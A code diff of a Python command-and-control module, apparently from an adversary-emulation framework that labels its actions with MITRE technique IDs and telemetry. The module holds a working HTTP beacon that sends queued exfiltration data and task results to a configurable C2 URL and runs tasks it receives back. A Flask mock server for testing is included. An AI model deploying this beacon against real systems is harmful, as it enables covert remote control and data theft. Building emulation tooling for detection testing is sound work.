@@ -1,14 +1,19 @@
-from typing import Dict, Any, Optional, List
-from datetime import datetime
-import random
-import requests
-import time
-import threading
+import json
 import logging
 import platform
-import uuid # For generating a unique agent ID
+import random
 import string
-import json
+import threading
+import time
+import uuid  # For generating a unique agent ID
+from datetime import datetime
+from pathlib import Path
+from typing import Any, Dict, List
+
+import requests
+
+from ..models import ModuleResult, TelemetryEvent
+
 
 class CommandControl:
     """Handles Command and Control operations, including C2 beaconing."""
@@ -22,7 +27,6 @@ class CommandControl:
             "beacon_timeout_seconds": 30, # Timeout for individual HTTP requests
             "max_beacon_attempts": 3, # Max consecutive failures before stopping beacon thread
             "include_task_results_in_beacon": True,
-            "modules": {"command_control": {"include_task_results_in_beacon": True}}
         }
         self.logger = logging.getLogger(__name__)
         self.beacon_threads: Dict[str, threading.Event] = {} # Store stop events for active beacons
@@ -34,14 +38,16 @@ class CommandControl:
 
     def update_config(self, config: Dict[str, Any]):
         """Update internal config with loaded configuration."""
-        self.config.update(config.get("command_control", {}))
+        module_config = config.get("modules", {}).get("command_control", {})
+        if isinstance(module_config, dict):
+            self.config.update(module_config)
         self.logger.info("CommandControl module configuration updated.")
 
     def run_operation(self, data: Dict[str, Any]) -> Dict[str, Any]:
         """Route C2 operation requests to appropriate handlers."""
         operation_type = data.get("operation")
         details = data.get("details", {})
-        
+
         handler_map = {
             "start_http_beacon": self._handle_http_beacon,
             "stop_http_beacon": self._handle_stop_beacon,
@@ -51,14 +57,14 @@ class CommandControl:
             "proxy": self._handle_not_implemented, # Handle legacy technique name
             "tunnel": self._handle_not_implemented, # Handle legacy technique name
         }
-        
+
         handler = handler_map.get(operation_type)
-        
+
         if handler:
             try:
                 result = handler(details)
                 # If starting a beacon, status reflects thread start success, not beacon success itself
-                return result 
+                return result
             except Exception as e:
                 self.logger.error(f"Error during C2 operation '{operation_type}': {e}", exc_info=True)
                 return {"status": "error", "message": str(e), "operation": operation_type}
@@ -108,35 +114,35 @@ class CommandControl:
                 jitter_amount = (interval * jitter / 100.0)
                 sleep_time = interval + random.uniform(-jitter_amount, jitter_amount)
                 sleep_time = max(0.1, sleep_time) # Ensure minimum sleep time
-                
+
                 self.logger.debug(f"[Beacon {beacon_id}] Sleeping for {sleep_time:.2f} seconds.")
                 stop_event.wait(timeout=sleep_time) # Use wait() for interruptible sleep
-                if stop_event.is_set(): break # Check again after sleep
+                if stop_event.is_set():
+                    break # Check again after sleep
 
-                # --- Prepare Beacon Data --- 
+                # --- Prepare Beacon Data ---
                 beacon_data = {"agent_id": self.agent_id, "timestamp": datetime.now().isoformat(), "status": "beacon"}
-                
+
                 # Include results and exfil data from queues
                 with self.queue_lock:
                     if include_results and self.task_results_queue:
                         beacon_data["results"] = self.task_results_queue[:]
-                        self.task_results_queue.clear() 
+                        self.task_results_queue.clear()
                         self.logger.debug(f"[Beacon {beacon_id}] Including {len(beacon_data['results'])} task results.")
                     if include_exfil and self.outgoing_exfil_queue:
                         # Embed exfil data under a specific key
                         beacon_data["exfil_data"] = self.outgoing_exfil_queue[:]
                         self.outgoing_exfil_queue.clear()
                         self.logger.debug(f"[Beacon {beacon_id}] Including {len(beacon_data['exfil_data'])} exfil chunks.")
-                # --- End Prepare Data --- 
+                # --- End Prepare Data ---
 
                 # Send request
                 self.logger.debug(f"[Beacon {beacon_id}] Sending {method} beacon to {c2_url}")
                 response = None
                 task_to_execute = None # Variable to hold received task
-                start_time = time.time()
                 try:
                     if method == "POST":
-                        response = requests.post(c2_url, headers=headers, json=beacon_data, 
+                        response = requests.post(c2_url, headers=headers, json=beacon_data,
                                                  timeout=timeout, verify=verify_ssl)
                     else: # GET
                         # GET requests with large payloads (results/exfil) are problematic
@@ -144,23 +150,26 @@ class CommandControl:
                         if "results" in beacon_data or "exfil_data" in beacon_data:
                              self.logger.warning(f"[Beacon {beacon_id}] Beacon contains results/exfil data but method is GET. Data might be lost or request may fail.")
                              # Optionally truncate or remove results/exfil for GET?
-                        
+
                         get_params = {}
                         for k, v in beacon_data.items():
-                             if isinstance(v, (dict, list)): # Attempt to JSON encode complex types
-                                  try: get_params[k] = json.dumps(v)
-                                  except Exception: get_params[k] = str(v)[:1000] # Limit length if cannot encode
-                             else: get_params[k] = v
-                        response = requests.get(c2_url, headers=headers, params=get_params, 
+                            if isinstance(v, (dict, list)):
+                                try:
+                                    get_params[k] = json.dumps(v)
+                                except Exception:
+                                    get_params[k] = str(v)[:1000]
+                            else:
+                                get_params[k] = v
+                        response = requests.get(c2_url, headers=headers, params=get_params,
                                                 timeout=timeout, verify=verify_ssl)
-                    
+
                     response.raise_for_status() # Raise exception for bad status codes (4xx or 5xx)
-                    
-                    # Process response 
+
+                    # Process response
                     self.logger.info(f"[Beacon {beacon_id}] Beacon sent successfully. Status: {response.status_code}. Response snippet: {response.text[:100]}")
                     # Reset failure count on success
                     failure_count = 0
-                    
+
                     # --- TASKING IMPLEMENTATION ---
                     # Attempt to parse response as JSON for tasks
                     try:
@@ -204,12 +213,12 @@ class CommandControl:
                     if failure_count >= max_failures:
                          self.logger.error(f"[Beacon {beacon_id}] Max beacon failures reached ({max_failures}) due to unexpected errors. Stopping worker.")
                          break # Exit loop
-                    
+
                 # --- Execute Task if received ---
                 if task_to_execute:
                     self._execute_received_task(task_to_execute)
                 # --------------------------------
-                    
+
             except Exception as outer_e:
                  # Catch errors in sleep/calculation logic
                  self.logger.error(f"[Beacon {beacon_id}] Error in main beacon loop: {outer_e}", exc_info=True)
@@ -226,7 +235,7 @@ class CommandControl:
         c2_url = details.get("c2_url")
 
         if not c2_url:
-            return {"status": "error", "message": "Missing 'c2_url' detail for starting beacon."} 
+            return {"status": "error", "message": "Missing 'c2_url' detail for starting beacon."}
 
         if beacon_id in self.beacon_threads:
             self.logger.warning(f"Beacon with ID '{beacon_id}' is already running.")
@@ -235,14 +244,14 @@ class CommandControl:
         self.logger.info(f"Received request to start HTTP beacon: {beacon_id}")
         stop_event = threading.Event()
         self.beacon_threads[beacon_id] = stop_event
-        
-        thread = threading.Thread(target=self._beacon_worker, 
-                                  args=(beacon_id, stop_event, details), 
+
+        thread = threading.Thread(target=self._beacon_worker,
+                                  args=(beacon_id, stop_event, details),
                                   daemon=True) # Daemon threads exit when main program exits
         thread.start()
-        
+
         self.logger.info(f"HTTP beacon thread '{beacon_id}' started.")
-        
+
         return {
             "status": "success",
             "technique": "c2_http_beacon_start",
@@ -258,10 +267,10 @@ class CommandControl:
 
         if not beacon_id:
             return {"status": "error", "message": "Missing 'beacon_id' detail for stopping beacon."}
-            
+
         self.logger.info(f"Received request to stop beacon: {beacon_id}")
         stop_event = self.beacon_threads.get(beacon_id)
-        
+
         if stop_event:
             stop_event.set() # Signal the thread to stop
             # Optionally wait for thread to finish with timeout?
@@ -290,10 +299,10 @@ class CommandControl:
               technique_name = inspect.currentframe().f_back.f_code.co_name.replace("_handle_", "")
          except Exception:
               technique_name = "unknown"
-              
+
          self.logger.warning(f"C2 technique '{technique_name}' is not yet implemented with realistic actions.")
          return {
-             "status": "skipped", 
+             "status": "skipped",
              "message": f"Technique '{technique_name}' not realistically implemented.",
              "technique": technique_name,
              "timestamp": datetime.now().isoformat(),
@@ -303,11 +312,11 @@ class CommandControl:
     # Deprecated simulation handlers - redirect to not implemented
     def _handle_proxy(self, data: Dict[str, Any]) -> Dict[str, Any]: return self._handle_not_implemented(data)
     def _handle_tunnel(self, data: Dict[str, Any]) -> Dict[str, Any]: return self._handle_not_implemented(data)
-            
+
     def _log_error(self, message: str, exc_info=False) -> None:
         """Log errors using the initialized logger."""
         self.logger.error(message, exc_info=exc_info)
-        
+
     def _generate_random_string(self, length: int = 8) -> str:
         """Generate a random string of fixed length."""
         letters = string.ascii_lowercase + string.digits
@@ -318,32 +327,32 @@ class CommandControl:
         task_id = task.get("task_id", f"task_{self._generate_random_string(4)}")
         module = task.get("module")
         operation_data = task.get("operation_data")
-        
+
         self.logger.info(f"Executing received task ID: {task_id}, Module: {module}")
-        
+
         result_payload = {
             "task_id": task_id,
             "status": "failure", # Default to failure
             "execution_timestamp": datetime.now().isoformat(),
             "result_data": {}
         }
-        
+
         if not module or not operation_data:
             self.logger.error(f"Task {task_id} is invalid (missing module or operation_data). Skipping.")
             result_payload["result_data"] = {"error": "Invalid task format received."}
         elif not self.nexus:
             self.logger.error(f"Nexus instance not available in C2 module. Cannot execute task {task_id}.")
-            result_payload["result_data"] = {"error": "Nexus instance unavailable."} 
+            result_payload["result_data"] = {"error": "Nexus instance unavailable."}
         else:
             try:
                 # Execute the operation using the main Nexus instance
                 task_result = self.nexus.execute_operation(module, operation_data)
-                
+
                 # Prepare the result payload
                 result_payload["status"] = task_result.get("status", "unknown")
                 result_payload["result_data"] = task_result # Include the full result dict
                 self.logger.info(f"Task {task_id} ({module}) execution finished with status: {result_payload['status']}")
-                
+
             except Exception as e:
                 self.logger.error(f"Exception executing task {task_id} ({module}): {e}", exc_info=True)
                 result_payload["result_data"] = {"error": f"Exception during execution: {e}"}
@@ -357,17 +366,62 @@ class CommandControl:
         else:
              self.logger.debug(f"Task results configured to not be sent via beacon. Discarding result for task {task_id}.")
 
+    def execute(self, params: Dict[str, Any], ctx: Dict[str, Any]) -> ModuleResult:
+        """Adapter used by the modular Nexus registry."""
+        operation = params.get("operation")
+        details = params.get("details", {})
+        raw_result = self.run_operation({"operation": operation, "details": details})
+
+        output_dir = Path(ctx["output_dir"]) / "command_control"
+        output_dir.mkdir(parents=True, exist_ok=True)
+        artifact = output_dir / "result.json"
+        artifact.write_text(json.dumps(raw_result, indent=2), encoding="utf-8")
+
+        raw_status = str(raw_result.get("status", "unknown")).lower()
+        if raw_status in {"error", "failure"}:
+            status = "error"
+        elif raw_status == "skipped":
+            status = "partial_success"
+        else:
+            status = "success"
+
+        telemetry = [
+            TelemetryEvent(
+                event_type="command_control_operation",
+                module="command_control",
+                details={
+                    "operation": operation or "unknown",
+                    "status": raw_result.get("status", "unknown"),
+                    "artifact": str(artifact),
+                },
+                severity="warning" if status != "success" else "info",
+            )
+        ]
+        return ModuleResult(
+            module="command_control",
+            status=status,
+            message=str(raw_result.get("message", "Command and control operation completed.")),
+            techniques=["T1071.001"],
+            telemetry=telemetry,
+            artifacts={"result_path": str(artifact), "operation_result": raw_result},
+            detection_hints={
+                "network_protocol": "http",
+                "process_image": "python",
+                "command_line_contains": ["beacon", "requests"],
+            },
+            error=str(raw_result.get("message", "")) if status == "error" else None,
+        )
+
 # Example Usage (for testing)
 if __name__ == '__main__':
     import json
-    import inspect # For _handle_not_implemented helper
-    
+
     logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(threadName)s - %(levelname)s - %(message)s')
 
     try:
-        from flask import Flask, request, jsonify
+        from flask import Flask, jsonify, request
         mock_server = Flask(__name__)
-        tasks_to_send = [] 
+        tasks_to_send = []
         mock_c2_logger = logging.getLogger("MockC2")
 
         @mock_server.route('/c2', methods=['GET', 'POST'])
@@ -377,7 +431,7 @@ if __name__ == '__main__':
             received_data = {}
             exfil_chunks_received = []
             if request.method == 'POST':
-                try: 
+                try:
                     received_data = request.json
                     mock_c2_logger.info(f"Received POST Data (keys): {list(received_data.keys())}")
                     if "exfil_data" in received_data:
@@ -388,10 +442,10 @@ if __name__ == '__main__':
                              mock_c2_logger.info(f"    First chunk: session={exfil_chunks_received[0].get('session_id')}, index={exfil_chunks_received[0].get('chunk_index')}, last={exfil_chunks_received[0].get('is_last')}")
                              if len(exfil_chunks_received) > 1:
                                   mock_c2_logger.info(f"    Last chunk: session={exfil_chunks_received[-1].get('session_id')}, index={exfil_chunks_received[-1].get('chunk_index')}, last={exfil_chunks_received[-1].get('is_last')}")
-                             
+
                     if "results" in received_data:
                          mock_c2_logger.info(f"---> Received {len(received_data['results'])} task results via POST.")
-                         
+
                 except Exception as e:
                      mock_c2_logger.warning(f"Could not parse POST JSON: {e}")
             else: # GET
@@ -400,23 +454,26 @@ if __name__ == '__main__':
                 # Decode results/exfil if present in GET params
                 for key in ['results', 'exfil_data']:
                     if key in received_data:
-                         try: 
+                         try:
                               decoded_data = json.loads(received_data[key])
                               mock_c2_logger.info(f"---> Received {len(decoded_data)} {key} items via GET param.")
-                         except Exception as e: mock_c2_logger.warning(f"Could not decode {key} from GET: {e}")
-                     
+                         except Exception as decode_err:
+                             mock_c2_logger.warning(
+                                 f"Could not decode {key} from GET: {decode_err}"
+                             )
+
             # Send back tasks
             response_tasks = tasks_to_send[:]
-            tasks_to_send.clear() 
+            tasks_to_send.clear()
             mock_c2_logger.info(f"Sending {len(response_tasks)} tasks to agent {agent_id}")
             return jsonify(response_tasks)
-            
+
         def run_mock_server():
             werkzeug_log = logging.getLogger('werkzeug')
             werkzeug_log.setLevel(logging.ERROR)
             mock_c2_logger.info("Starting mock server...")
             mock_server.run(host='0.0.0.0', port=8080)
-            
+
         server_thread = threading.Thread(target=run_mock_server, daemon=True, name="MockC2ServerThread")
         server_thread.start()
         logging.info("Mock C2 server starting on port 8080...")
@@ -433,14 +490,20 @@ if __name__ == '__main__':
         def execute_operation(self, module_name: str, operation_data: Dict[str, Any]) -> Dict[str, Any]:
             print(f"\n<------ [MockNexus] Received task! Module: '{module_name}', Data: {operation_data} ------>\n")
             time.sleep(0.5)
-            return {"status": "success", "message": f"Task executed by MockNexus for {module_name}", "module": module_name}
-            
-    mock_nexus_instance = MockNexus()
-    c2_module = CommandControl(nexus_instance=mock_nexus_instance) 
-    # Enable sending results back in this test
-    c2_module.update_config({"modules": {"command_control": {"include_task_results_in_beacon": True}}}) 
+            return {
+                "status": "success",
+                "message": f"Task executed by MockNexus for {module_name}",
+                "module": module_name,
+            }
 
-    # ... (rest of the example tests can remain largely the same, 
+    mock_nexus_instance = MockNexus()
+    c2_module = CommandControl(nexus_instance=mock_nexus_instance)
+    # Enable sending results back in this test
+    c2_module.update_config(
+        {"modules": {"command_control": {"include_task_results_in_beacon": True}}}
+    )
+
+    # ... (rest of the example tests can remain largely the same,
     #      they primarily test beacon start/stop and tasking reception) ...
     # ... (The Exfiltration module example now becomes more relevant for testing the queuing) ...
 
@@ -452,6 +515,6 @@ if __name__ == '__main__':
     print(f"Start result: {start_result_cleanup.get('status')}")
 
     print("\n--- Cleaning up any remaining beacons via stop_beaconing() ---")
-    c2_module.stop_beaconing() 
-    time.sleep(2) 
-    print("\nExample usage finished.") 
+    c2_module.stop_beaconing()
+    time.sleep(2)
+    print("\nExample usage finished.")
